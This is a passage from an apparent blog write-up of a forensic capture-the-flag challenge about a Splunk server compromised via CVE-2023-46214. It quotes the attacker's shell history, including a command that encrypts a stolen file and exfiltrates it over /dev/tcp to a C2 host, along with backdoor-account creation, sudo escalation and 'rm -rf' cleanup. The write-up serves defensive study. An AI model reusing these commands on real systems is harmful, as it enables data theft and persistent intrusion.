</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/exsl:document&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;/xsl:template&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/xsl:stylesheet&gt;</span>
</span></span></code></pre></div><p>Then the TA used Splunks SPL Query Language to execute the payload.
<img src="images/20240615093453.png" alt="alt text"></p>
<p>Apparently, the TA exploited <a href="https://www.cvedetails.com/cve/CVE-2023-46214/">CVE-2023-46214</a> to compromise the Splunk Server. According to <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46214">NIST</a>: <em>In Splunk Enterprise versions below 9.0.7 and 9.1.2, Splunk Enterprise does not safely sanitize extensible stylesheet language transformations (XSLT) that users supply. This means that an attacker can upload malicious XSLT which can result in remote code execution on the Splunk Enterprise instance.</em></p>
<p>The Splunk Server version was <code>9.0.5</code>. We can confirm this by the following data.
<img src="images/20240615094425.png" alt="alt text"></p>
<p>It&rsquo;s an authenticated remote code execution vulnerability, and the TA used the following credential to log into the Splunk Admin Panel.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>username=johnnyC
</span></span><span style="display:flex;"><span>password=h3Re15j0hnNy
</span></span></code></pre></div><p>Some how the credential was stolen by the TA.</p>
<p>To search for the default time that was before and the default time that was set after, I took a look inside the <code>/var/log</code> directory. And I found two files that seemed archived log.</p>
<p><strong>vmware-network.log</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>+ chmod 0600 /var/log/vmware-network.log
</span></span><span style="display:flex;"><span>+ date
</span></span><span style="display:flex;"><span>+ echo Sun 14 Apr 2024 09:57:59 PM +07 : Executing &#39;/etc/vmware-tools/scripts/vmware/network resume-vm&#39;
</span></span><span style="display:flex;"><span>Sun 14 Apr 2024 09:57:59 PM +07 : Executing &#39;/etc/vmware-tools/scripts/vmware/network resume-vm&#39;
</span></span><span style="display:flex;"><span>+ echo
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>+ dirname /etc/vmware-tools/scripts/vmware/network
</span></span><span style="display:flex;"><span>+ . /etc/vmware-tools/scripts/vmware/../../statechange.subr
</span></span><span style="display:flex;"><span>+ main resume-vm
</span></span><span style="display:flex;"><span>+ exitCode=0
</span></span><span style="display:flex;"><span>+ activeList=/var/run/vmware-active-nics
</span></span><span style="display:flex;"><span>+ WakeNetworkManager
</span></span><span style="display:flex;"><span>+ which dbus-send
</span></span><span style="display:flex;"><span>+ dbusSend=/usr/bin/dbus-send
</span></span><span style="display:flex;"><span>+ rc=0
</span></span><span style="display:flex;"><span>+ [ 0 = 0 ]
</span></span><span style="display:flex;"><span>+ /usr/bin/dbus-send --system --print-reply --dest=org.freedesktop.NetworkManager /org/freedesktop/NetworkManager org.freedesktop.NetworkManager.Enable boolean:true
</span></span><span style="display:flex;"><span>Error org.freedesktop.NetworkManager.AlreadyEnabledOrDisabled: Already enabled
</span></span><span style="display:flex;"><span>+ rc=1
</span></span><span style="display:flex;"><span>+ [ 1 = 0 ]
</span></span><span style="display:flex;"><span>+ /usr/bin/dbus-send --system --print-reply --dest=org.freedesktop.NetworkManager /org/freedesktop/NetworkManager org.freedesktop.NetworkManager.Sleep boolean:false
</span></span><span style="display:flex;"><span>Error org.freedesktop.NetworkManager.AlreadyAsleepOrAwake: Already awake
</span></span><span style="display:flex;"><span>+ rc=1
</span></span><span style="display:flex;"><span>+ [ 1 = 0 ]
</span></span><span style="display:flex;"><span>+ /usr/bin/dbus-send --system --print-reply --dest=org.freedesktop.NetworkManager /org/freedesktop/NetworkManager org.freedesktop.NetworkManager.wake
</span></span><span style="display:flex;"><span>Error org.freedesktop.DBus.Error.UnknownMethod: No such method “wake”
</span></span><span style="display:flex;"><span>+ rc=1
</span></span><span style="display:flex;"><span>+ return 1
</span></span><span style="display:flex;"><span>+ exitCode=1
</span></span><span style="display:flex;"><span>+ [ 1 != 0 ]
</span></span><span style="display:flex;"><span>+ sanity_check resume-vm
</span></span><span style="display:flex;"><span>+ which ip
</span></span><span style="display:flex;"><span>+ ip_cmd=/usr/sbin/ip
</span></span><span style="display:flex;"><span>+ which ifconfig
</span></span><span style="display:flex;"><span>+ ifconfig_cmd=
</span></span><span style="display:flex;"><span>+ which ifup
</span></span><span style="display:flex;"><span>+ ifup_cmd=
</span></span><span style="display:flex;"><span>+ which ifdown
</span></span><span style="display:flex;"><span>+ ifdown_cmd=
</span></span><span style="display:flex;"><span>+ [ -z  -a -z /usr/sbin/ip ]
</span></span><span style="display:flex;"><span>+ [ ! -s /var/run/vmware-active-nics ]
</span></span><span style="display:flex;"><span>+ save_active_NIC_list
</span></span><span style="display:flex;"><span>+ local intf_out
</span></span><span style="display:flex;"><span>+ 
</span></span><span style="display:flex;"><span>+ [ -n /usr/sbin/ip ]
</span></span><span style="display:flex;"><span>+ /usr/sbin/ip link show up
</span></span><span style="display:flex;"><span>+ egrep \bUP\b
</span></span><span style="display:flex;"><span>+ awk -F: {print $2}
</span></span><span style="display:flex;"><span>+ /usr/sbin/ip link show lo
</span></span><span style="display:flex;"><span>+ grep -iq link/ether
</span></span><span style="display:flex;"><span>+ grep -iq link/ether
</span></span><span style="display:flex;"><span>+ /usr/sbin/ip link show ens33
</span></span><span style="display:flex;"><span>+ echo ens33
</span></span><span style="display:flex;"><span>+ run_network_script start
</span></span><span style="display:flex;"><span>+ local action=start
</span></span><span style="display:flex;"><span>+ local rc=0
</span></span><span style="display:flex;"><span>+ local script
</span></span><span style="display:flex;"><span>+ true
</span></span><span style="display:flex;"><span>+ exec_systemctl_service start
</span></span><span style="display:flex;"><span>+ local rc=1
</span></span><span style="display:flex;"><span>+ local action=start
</span></span><span style="display:flex;"><span>+ which systemctl
</span></span><span style="display:flex;"><span>+ local ctlcmd=/usr/bin/systemctl
</span></span><span style="display:flex;"><span>+ local service
</span></span><span style="display:flex;"><span>+ [ -z /usr/bin/systemctl ]
</span></span><span style="display:flex;"><span>+ /usr/bin/systemctl status systemd-networkd
</span></span><span style="display:flex;"><span>+ grep -iq not-found
</span></span><span style="display:flex;"><span>+ service=systemd-networkd
</span></span><span style="display:flex;"><span>+ break
</span></span><span style="display:flex;"><span>+ [ -z systemd-networkd ]
</span></span><span style="display:flex;"><span>+ /usr/bin/systemctl start systemd-networkd
</span></span><span style="display:flex;"><span>+ rc=0
</span></span><span style="display:flex;"><span>+ [ 0 = 0 -a systemd-networkd = systemd-networkd -a start = stop ]
</span></span><span style="display:flex;"><span>+ return 0
</span></span><span style="display:flex;"><span>+ [ 0 != 0 ]
</span></span><span style="display:flex;"><span>+ break
</span></span><span style="display:flex;"><span>+ return 0
</span></span><span style="display:flex;"><span>+ rescue_NIC
</span></span><span style="display:flex;"><span>+ local rc=0
</span></span><span style="display:flex;"><span>+ local intf_out
</span></span><span style="display:flex;"><span>+ [ -f /var/run/vmware-active-nics ]
</span></span><span style="display:flex;"><span>+ read nic
</span></span><span style="display:flex;"><span>+ [ -n /usr/sbin/ip ]
</span></span><span style="display:flex;"><span>+ /usr/sbin/ip link show ens33 up
</span></span><span style="display:flex;"><span>+ intf_out=2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000
</span></span><span style="display:flex;"><span>    link/ether 00:0c:29:e1:89:42 brd ff:ff:ff:ff:ff:ff
</span></span><span style="display:flex;"><span>    altname enp2s1
</span></span><span style="display:flex;"><span>+ grep -q UP
</span></span><span style="display:flex;"><span>+ echo 2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000 link/ether 00:0c:29:e1:89:42 brd ff:ff:ff:ff:ff:ff altname enp2s1
</span></span><span style="display:flex;"><span>+ date
</span></span><span style="display:flex;"><span>+ echo Sun 14 Apr 2024 09:57:58 PM +07 [rescue_nic] ens33 is already active.
</span></span><span style="display:flex;"><span>Sun 14 Apr 2024 09:57:58 PM +07 [rescue_nic] ens33 is already active.
</span></span><span style="display:flex;"><span>+ read nic
</span></span><span style="display:flex;"><span>+ rm -f /var/run/vmware-active-nics
</span></span><span style="display:flex;"><span>+ return 0
</span></span><span style="display:flex;"><span>+ exitCode=0
</span></span><span style="display:flex;"><span>+ return 0
</span></span><span style="display:flex;"><span>+ date
</span></span><span style="display:flex;"><span>+ echo Sun 14 Apr 2024 09:57:58 PM +07 : Finished &#39;/etc/vmware-tools/scripts/vmware/network resume-vm&#39;
</span></span><span style="display:flex;"><span>Sun 14 Apr 2024 09:57:58 PM +07 : Finished &#39;/etc/vmware-tools/scripts/vmware/network resume-vm&#39;
</span></span></code></pre></div><p>Found the current Timezone offset which is <code>+07</code>.</p>
<p><strong>vmware-network.2.log</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>+ chmod 0600 /var/log/vmware-network.log
</span></span><span style="display:flex;"><span>+ date
</span></span><span style="display:flex;"><span>+ echo Sat 13 Apr 2024 11:19:41 PM PDT : Executing &#39;/etc/vmware-tools/scripts/vmware/network poweron-vm&#39;
</span></span><span style="display:flex;"><span>Sat 13 Apr 2024 11:19:41 PM PDT : Executing &#39;/etc/vmware-tools/scripts/vmware/network poweron-vm&#39;
</span></span><span style="display:flex;"><span>+ echo
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>+ dirname /etc/vmware-tools/scripts/vmware/network
</span></span><span style="display:flex;"><span>+ . /etc/vmware-tools/scripts/vmware/../../statechange.subr
</span></span><span style="display:flex;"><span>+ main poweron-vm
</span></span><span style="display:flex;"><span>+ exitCode=0
</span></span><span style="display:flex;"><span>+ activeList=/var/run/vmware-active-nics
</span></span><span style="display:flex;"><span>+ rm -f /var/run/vmware-active-nics
</span></span><span style="display:flex;"><span>+ return 0
</span></span><span style="display:flex;"><span>+ date
</span></span><span style="display:flex;"><span>+ echo Sat 13 Apr 2024 11:19:41 PM PDT : Finished &#39;/etc/vmware-tools/scripts/vmware/network poweron-vm&#39;
</span></span><span style="display:flex;"><span>Sat 13 Apr 2024 11:19:41 PM PDT : Finished &#39;/etc/vmware-tools/scripts/vmware/network poweron-vm&#39;
</span></span></code></pre></div><p>We were also able to find the previous Timezone that was set to <code>PDT</code>. Using <a href="https://www.epochconverter.com/timezones">Epoch Converter</a> I was able to find the <code>PDT</code> timezone&rsquo;s offset which were <code>-07</code></p>
<p><img src="images/20240615104930.png" alt="alt text"></p>
<p>Next up we need to calculate the dwell time for <code>nginx</code> user creation to SSH logout session.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat auth.log | grep -i nginx
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:13 ubuntu groupadd<span style="color:#ff79c6">[</span>13358<span style="color:#ff79c6">]</span>: group added to /etc/group: <span style="color:#8be9fd;font-style:italic">name</span><span style="color:#ff79c6">=</span>nginx, <span style="color:#8be9fd;font-style:italic">GID</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">1002</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:13 ubuntu groupadd<span style="color:#ff79c6">[</span>13358<span style="color:#ff79c6">]</span>: group added to /etc/gshadow: <span style="color:#8be9fd;font-style:italic">name</span><span style="color:#ff79c6">=</span>nginx
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:13 ubuntu groupadd<span style="color:#ff79c6">[</span>13358<span style="color:#ff79c6">]</span>: new group: <span style="color:#8be9fd;font-style:italic">name</span><span style="color:#ff79c6">=</span>nginx, <span style="color:#8be9fd;font-style:italic">GID</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">1002</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:13 ubuntu useradd<span style="color:#ff79c6">[</span>13364<span style="color:#ff79c6">]</span>: new user: <span style="color:#8be9fd;font-style:italic">name</span><span style="color:#ff79c6">=</span>nginx, <span style="color:#8be9fd;font-style:italic">UID</span><span style="color:#ff79c6">=</span>1002, <span style="color:#8be9fd;font-style:italic">GID</span><span style="color:#ff79c6">=</span>1002, <span style="color:#8be9fd;font-style:italic">home</span><span style="color:#ff79c6">=</span>/var/www/, <span style="color:#8be9fd;font-style:italic">shell</span><span style="color:#ff79c6">=</span>/bin/bash, <span style="color:#8be9fd;font-style:italic">from</span><span style="color:#ff79c6">=</span>none
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:13 ubuntu usermod<span style="color:#ff79c6">[</span>13376<span style="color:#ff79c6">]</span>: change user <span style="color:#f1fa8c">&#39;nginx&#39;</span> password
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:13 ubuntu chfn<span style="color:#ff79c6">[</span>13383<span style="color:#ff79c6">]</span>: changed user <span style="color:#f1fa8c">&#39;nginx&#39;</span> information
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:13 ubuntu chpasswd<span style="color:#ff79c6">[</span>13394<span style="color:#ff79c6">]</span>: pam_unix<span style="color:#ff79c6">(</span>chpasswd:chauthtok<span style="color:#ff79c6">)</span>: password changed <span style="color:#ff79c6">for</span> nginx
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:13 ubuntu usermod<span style="color:#ff79c6">[</span>13397<span style="color:#ff79c6">]</span>: add <span style="color:#f1fa8c">&#39;nginx&#39;</span> to group <span style="color:#f1fa8c">&#39;sudo&#39;</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:13 ubuntu usermod<span style="color:#ff79c6">[</span>13397<span style="color:#ff79c6">]</span>: add <span style="color:#f1fa8c">&#39;nginx&#39;</span> to shadow group <span style="color:#f1fa8c">&#39;sudo&#39;</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:21 ubuntu sshd<span style="color:#ff79c6">[</span>13461<span style="color:#ff79c6">]</span>: Accepted publickey <span style="color:#ff79c6">for</span> nginx from 192.168.222.130 port <span style="color:#bd93f9">43302</span> ssh2: RSA SHA256:zRdVnxnRPJ37HDm5KkRvQbklvc2PfFL3av8W1Jb6QoE
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:21 ubuntu sshd<span style="color:#ff79c6">[</span>13461<span style="color:#ff79c6">]</span>: pam_unix<span style="color:#ff79c6">(</span>sshd:session<span style="color:#ff79c6">)</span>: session opened <span style="color:#ff79c6">for</span> user nginx by <span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:21 ubuntu systemd-logind<span style="color:#ff79c6">[</span>673<span style="color:#ff79c6">]</span>: New session <span style="color:#bd93f9">7</span> of user nginx.
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:22 ubuntu systemd: pam_unix<span style="color:#ff79c6">(</span>systemd-user:session<span style="color:#ff79c6">)</span>: session opened <span style="color:#ff79c6">for</span> user nginx by <span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:54 ubuntu sudo:    nginx : <span style="color:#8be9fd;font-style:italic">TTY</span><span style="color:#ff79c6">=</span>pts/2 ; <span style="color:#8be9fd;font-style:italic">PWD</span><span style="color:#ff79c6">=</span>/opt/splunk/bin/scripts ; <span style="color:#8be9fd;font-style:italic">USER</span><span style="color:#ff79c6">=</span>root ; <span style="color:#8be9fd;font-style:italic">COMMAND</span><span style="color:#ff79c6">=</span>/usr/bin/rm -rf search.sh
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:54 ubuntu sudo: pam_unix<span style="color:#ff79c6">(</span>sudo:session<span style="color:#ff79c6">)</span>: session opened <span style="color:#ff79c6">for</span> user root by nginx<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:59 ubuntu sudo:    nginx : <span style="color:#8be9fd;font-style:italic">TTY</span><span style="color:#ff79c6">=</span>pts/2 ; <span style="color:#8be9fd;font-style:italic">PWD</span><span style="color:#ff79c6">=</span>/opt/splunk/bin/scripts ; <span style="color:#8be9fd;font-style:italic">USER</span><span style="color:#ff79c6">=</span>root ; <span style="color:#8be9fd;font-style:italic">COMMAND</span><span style="color:#ff79c6">=</span>/usr/bin/su
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:59 ubuntu sudo: pam_unix<span style="color:#ff79c6">(</span>sudo:session<span style="color:#ff79c6">)</span>: session opened <span style="color:#ff79c6">for</span> user root by nginx<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:59 ubuntu su: <span style="color:#ff79c6">(</span>to root<span style="color:#ff79c6">)</span> nginx on pts/2
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:59 ubuntu su: pam_unix<span style="color:#ff79c6">(</span>su:session<span style="color:#ff79c6">)</span>: session opened <span style="color:#ff79c6">for</span> user root by nginx<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:02:21 ubuntu sudo:    nginx : <span style="color:#8be9fd;font-style:italic">TTY</span><span style="color:#ff79c6">=</span>pts/2 ; <span style="color:#8be9fd;font-style:italic">PWD</span><span style="color:#ff79c6">=</span>/var/www ; <span style="color:#8be9fd;font-style:italic">USER</span><span style="color:#ff79c6">=</span>root ; <span style="color:#8be9fd;font-style:italic">COMMAND</span><span style="color:#ff79c6">=</span>/usr/bin/mv /home/johnnycage/Documents/Important.pdf .
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:02:21 ubuntu sudo: pam_unix<span style="color:#ff79c6">(</span>sudo:session<span style="color:#ff79c6">)</span>: session opened <span style="color:#ff79c6">for</span> user root by nginx<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:02:54 ubuntu sudo:    nginx : <span style="color:#8be9fd;font-style:italic">TTY</span><span style="color:#ff79c6">=</span>pts/2 ; <span style="color:#8be9fd;font-style:italic">PWD</span><span style="color:#ff79c6">=</span>/var/www ; <span style="color:#8be9fd;font-style:italic">USER</span><span style="color:#ff79c6">=</span>root ; <span style="color:#8be9fd;font-style:italic">COMMAND</span><span style="color:#ff79c6">=</span>/usr/bin/openssl enc -aes-256-cbc -iv 4fa17640b7dfe8799f072c65b15f581d -K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d -in data.zip
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:02:54 ubuntu sudo: pam_unix<span style="color:#ff79c6">(</span>sudo:session<span style="color:#ff79c6">)</span>: session opened <span style="color:#ff79c6">for</span> user root by nginx<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:03:01 ubuntu sudo:    nginx : <span style="color:#8be9fd;font-style:italic">TTY</span><span style="color:#ff79c6">=</span>pts/2 ; <span style="color:#8be9fd;font-style:italic">PWD</span><span style="color:#ff79c6">=</span>/var/www ; <span style="color:#8be9fd;font-style:italic">USER</span><span style="color:#ff79c6">=</span>root ; <span style="color:#8be9fd;font-style:italic">COMMAND</span><span style="color:#ff79c6">=</span>/usr/bin/rm -rf data.zip Important.pdf
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:03:01 ubuntu sudo: pam_unix<span style="color:#ff79c6">(</span>sudo:session<span style="color:#ff79c6">)</span>: session opened <span style="color:#ff79c6">for</span> user root by nginx<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:03:08 ubuntu sshd<span style="color:#ff79c6">[</span>13702<span style="color:#ff79c6">]</span>: Disconnected from user nginx 192.168.222.130 port <span style="color:#bd93f9">43302</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:03:08 ubuntu sshd<span style="color:#ff79c6">[</span>13461<span style="color:#ff79c6">]</span>: pam_unix<span style="color:#ff79c6">(</span>sshd:session<span style="color:#ff79c6">)</span>: session closed <span style="color:#ff79c6">for</span> user nginx
</span></span></code></pre></div><p>The <code>useradd</code> command was issued on  <code>Apr 14 08:00:13</code> and the session for nginx user was closed on <code>Apr 14 08:03:08</code>. I used the [[Time]] resource&rsquo;s Add Subtract Time website to calculate the time difference. It was 2 minutes and 55 seconds.</p>
<p>Then to find the password of the <code>nginx</code> I copied the following snippet from the malicious XSLT file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ <span style="color:#8be9fd;font-style:italic">access</span><span style="color:#ff79c6">=</span><span style="color:#ff79c6">$(</span><span style="color:#8be9fd;font-style:italic">echo</span> MzlhNmJiZTY0NTYzLTY3MDktOTNhNC1hOWYzLTJjZTc4Mjhm | base64 -d | rev<span style="color:#ff79c6">)</span>;<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;nginx:</span><span style="color:#8be9fd;font-style:italic">$access</span><span style="color:#f1fa8c">&#34;</span>;     
</span></span><span style="display:flex;"><span>nginx:f8287ec2-3f9a-4a39-9076-36546ebb6a93
</span></span></code></pre></div><p>The password for the <code>nginx</code> user is stored inside the <code>$access</code> variable.</p>
<p>Task 7 was really hard for me. I first read the attacker <code>.bash_history</code> file and fond the following commands the TA ran.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>whoami
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">cd</span> /opt/splunk/bin/scripts/
</span></span><span style="display:flex;"><span>ls
</span></span><span style="display:flex;"><span>sudo rm -rf search.sh 
</span></span><span style="display:flex;"><span>ls
</span></span><span style="display:flex;"><span>sudo su
</span></span><span style="display:flex;"><span>ls
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">cd</span> /home/johnnycage/
</span></span><span style="display:flex;"><span>tree
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">cd</span> ~
</span></span><span style="display:flex;"><span>ls
</span></span><span style="display:flex;"><span>sudo mv /home/johnnycage/Documents/Important.pdf .
</span></span><span style="display:flex;"><span>ls
</span></span><span style="display:flex;"><span>zip data.zip *
</span></span><span style="display:flex;"><span>ls
</span></span><span style="display:flex;"><span>sudo openssl enc -aes-256-cbc -iv <span style="color:#ff79c6">$(</span>cut -c 1-32 <span style="color:#ff79c6">&lt;&lt;&lt;</span> <span style="color:#ff79c6">$(</span>uname -r | md5sum<span style="color:#ff79c6">))</span> -K <span style="color:#ff79c6">$(</span>cut -c 1-64 <span style="color:#ff79c6">&lt;&lt;&lt;</span> <span style="color:#ff79c6">$(</span>date +%s | sha256sum<span style="color:#ff79c6">))</span> -in data.zip | base64 | dd <span style="color:#8be9fd;font-style:italic">conv</span><span style="color:#ff79c6">=</span>ebcdic &gt; /dev/tcp/192.168.222.130/8080
</span></span><span style="display:flex;"><span>sudo rm -rf *
</span></span><span style="display:flex;"><span>ls
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">exit</span>
</span></span></code></pre></div><p>At a first glance it&rsquo;s a clever trick to hide the used key and iv for the AES-256-CBC algorithm used to encrypt the exfiltrated file. There&rsquo;s a lot of randomness to both the key and iv.</p>
<p>But examining the <code>auth.log</code> we found the plain command that was ran by the <code>nginx</code> user.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ cat auth.log | grep -i .zip               
</span></span><span style="display:flex;"><span>Apr 14 08:02:54 ubuntu sudo:    nginx : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/openssl enc -aes-256-cbc -iv 4fa17640b7dfe8799f072c65b15f581d -K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d -in data.zip
</span></span><span style="display:flex;"><span>Apr 14 08:03:01 ubuntu sudo:    nginx : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/rm -rf data.zip Important.pdf
</span></span></code></pre></div><p>We found the Key and the IV for the data.zip file. But, unfortunately the TA deleted the files both <code>data.zip</code> and <code>Important.pdf</code>. I scoured the whole OS directories and files to find the file but to my ignorance I completely ignored the <code>capture.pcapng</code> file.</p>
<p>So, I opened up Wireshark again and searched for the port <code>8080</code>.
<img src="images/20240615181116.png" alt="alt text"></p>
<p>I followed the TCP stream and exported the data in <code>ASCII</code> format.
<img src="images/20240615181240.png" alt="alt text"></p>
<p>But, I couldn&rsquo;t decrypt the <code>data.zip</code>. Something was not right as I completely ignored another hint from the commands ran by the TA. Before, exfiltrating the data the did some encoding to the data.zip file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo openssl enc -aes-256-cbc -iv <span style="color:#ff79c6">$(</span>cut -c 1-32 <span style="color:#ff79c6">&lt;&lt;&lt;</span> <span style="color:#ff79c6">$(</span>uname -r | md5sum<span style="color:#ff79c6">))</span> -K <span style="color:#ff79c6">$(</span>cut -c 1-64 <span style="color:#ff79c6">&lt;&lt;&lt;</span> <span style="color:#ff79c6">$(</span>date +%s | sha256sum<span style="color:#ff79c6">))</span> -in data.zip | base64 | dd <span style="color:#8be9fd;font-style:italic">conv</span><span style="color:#ff79c6">=</span>ebcdic &gt; /dev/tcp/192.168.222.130/8080
</span></span></code></pre></div><p>They first converted the encrypted data.zip file to <code>base64</code> and then used <code>dd conv=ebcdic</code> to convert the codec from <code>ASCII</code> to <code>EBCDIC</code>.</p>
<p>This time I exported the whole TCP stream in <code>EBCDIC</code> which reversed the <code>EBCDIC</code> conversion back to <code>ASCII</code>.
<img src="images/20240615181906.png" alt="alt text">
We can see the content is now in <code>base64</code> when I selected show data as <code>EBCDIC</code>.</p>
<p>Then, decoded the <code>base64</code> back to encrypted <code>data.zip</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ base64 -di data &gt; data.zip
</span></span></code></pre></div><p>Now we got the encrypted data.zip file. We can now successfully try to decrypt it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ openssl enc -d -aes-256-cbc -iv 4fa17640b7dfe8799f072c65b15f581d -K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d -in data.zip -out data_dec.zip
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ unzip data_dec.zip
</span></span><span style="display:flex;"><span>Archive:  data_dec.zip
</span></span><span style="display:flex;"><span>  inflating: Important.pdf
</span></span></code></pre></div><p>Found, the <code>Important.pdf</code>. And found the answer to Task 7.
<img src="images/20240615182506.png" alt="alt text"></p>
<p>For the Task 8, we can easily find the credential using Wireshark.
<img src="images/20240615182843.png" alt="alt text"></p>
<h3 id="summary">Summary</h3>
<p>In this Sherlock, the TA exploited the Splunk Server to run a malicious bash script embedded in XSLT file. The bash script contained a persistence mechanism to add a new user onto the system and to the sudo group. The TA also injected a public key to the newly created user <code>nginx</code>&rsquo;s <code>.ssh/authorized_keys</code> to access the backdoor account. After that the TA logged in as <code>nginx</code> and elevated their privileges to <code>root</code> using <code>su</code>. Then the TA moved an important file from <code>johnycage</code>&rsquo;s <code>Documents</code> directory and encrypted the file and exfiltrated the file to his own C2 server <code>192.168.222.130:8080</code>.</p>
]]></description></item></channel></rss>